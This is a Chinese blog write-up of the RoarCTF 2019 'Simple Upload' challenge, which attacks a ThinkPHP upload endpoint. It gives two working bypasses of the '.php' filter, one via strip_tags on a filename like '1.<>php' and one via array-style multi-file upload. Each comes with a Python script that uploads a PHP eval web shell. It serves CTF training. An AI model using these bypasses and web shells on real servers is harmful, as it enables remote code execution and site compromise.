---
title: '[RoarCTF 2019]Simple Upload'
date: 2024-09-22 19:21:07
tags: 
      - thinkphp
      - 文件上传
categories: 刷题笔记
---

## [RoarCTF 2019]Simple Upload

我们打开页面进行代码审计

```
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller
{
    public function index()
    {
        show_source(__FILE__);
    }
    public function upload()
    {
        $uploadFile = $_FILES['file'] ;
        
        if (strstr(strtolower($uploadFile['name']), ".php") ) {
            return false;
        }
        
        $upload = new \Think\Upload();// 实例化上传类
        $upload->maxSize  = 4096 ;// 设置附件上传大小
        $upload->allowExts  = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型
        $upload->rootPath = './Public/Uploads/';// 设置附件上传目录
        $upload->savePath = '';// 设置附件上传子目录
        $info = $upload->upload() ;
        if(!$info) {// 上传错误提示错误信息
          $this->error($upload->getError());
          return;
        }else{// 上传成功 获取上传文件信息
          $url = __ROOT__.substr($upload->rootPath,1).$info['file']['savepath'].$info['file']['savename'] ;
          echo json_encode(array("url"=>$url,"success"=>1));
        }
    }
}
```

是一个文件上传，但根往常的不一样，文件上传没有上传键

通过查询wp，我们发现这道题其实是定义了一个路由，我们知到在路由里，默认上传路径是/home/index/upload,但在这道题里，如果我们直接访问url+/home/index/upload，会直接报404错误，这里来解释一下 

<!--more-->

![image-20240922192915768](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409221929910.png)

所以我们找到了题目的上传路径。



### 解法一

### 代码层绕过

主要是传进入的文件名在处理的时候被这么处理：

```
        foreach ($files as $key => $file) {
            $file['name']  = strip_tags($file['name']);
            if(!isset($file['key']))   $file['key']    =   $key;
            /* 通过扩展获取文件类型，可解决FLASH上传$FILES数组返回文件类型错误的问题 */
            if(isset($finfo)){
                $file['type']   =   finfo_file ( $finfo ,  $file['tmp_name'] );
            }

```

这里有个strip_tags-— 从字符串中去除 HTML 和 PHP 标签

那我们能直接绕过，传`1.<>php`

```
import  requests

url = "http://8cbe0e9c-b7de-46f3-b93d-555073775ad1.node3.buuoj.cn/index.php/home/index/upload"

files={'file':('1.<>php',"<?php eval($_GET['cmd'])?>")}
r=requests.post(url=url,files=files)
print(r.text)

```

得到.

![image-20240922193315013](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409221933040.png)

我们访问这个文件(注意去左斜杠\\)，得到flag

![image-20240922193609587](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409221936620.png)

### 解法二

upload批量上传

原因

```
thinkPHP里的upload()函数在不传参的情况下是批量上传的
```

因此如果上传多个文件，这里的处理：

```
        $uploadFile = $_FILES['file'] ;

        if (strstr(strtolower($uploadFile['name']), ".php") ) {
            return false;
        }

```

`$uploadFile['name']`是个数组，里面的每个元素是文件名。因此对数组操作，这里肯定可以绕过了，之后的处理也不用管了，反正支持多文件上传，和正常的单文件上传最后肯定是一样的。

师傅的脚本

```
import requests
url = "http://8cbe0e9c-b7de-46f3-b93d-555073775ad1.node3.buuoj.cn/index.php/home/index/upload"
files = {'file':("1.txt","")}
files2={'file[]':('1.php',"<?php eval($_GET['cmd'])?>")}
r = requests.post(url,files = files)
print (r.text)
r = requests.post(url,files = files2)
print (r.text)
r = requests.post(url,files = files)
print (r.text)

```

我们发现文件名都是通过uniqid得到的，这是根据当前时间来得到的随机数，取这么个区间：

![image-20240922193951774](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409221939845.png)

直接爆破最后的那几位即可
